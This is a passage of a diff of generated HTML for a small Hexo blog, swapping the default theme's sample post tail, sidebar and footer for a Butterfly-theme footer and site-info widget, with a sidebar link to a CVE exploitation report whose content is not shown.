-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://yayin222.github.io/2026/04/01/hello-world/" data-id="cuiddmKudGG4TjGqcPIwd5HeJ" data-title="Hello World" class="article-share-link"><span class="fa fa-share">分享</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">分类</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE/" rel="tag">CVE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cisco-FMC/" rel="tag">Cisco FMC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">标签云</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/CVE/" style="font-size: 10px;">CVE</a> <a href="/tags/Cisco-FMC/" style="font-size: 10px;">Cisco FMC</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">反序列化</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">归档</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/04/">四月 2026</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">最新文章</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2026/04/01/CVE-2026-20131-%E5%AE%8C%E6%95%B4%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/">CVE-2026-20131 完整漏洞利用分析报告</a>
-          </li>
-        
-          <li>
-            <a href="/2026/04/01/hello-world/">Hello World</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2026 Yayin<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
-</body>
-</html>
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">2</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-04-01T09:22:57.992Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Yayin</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
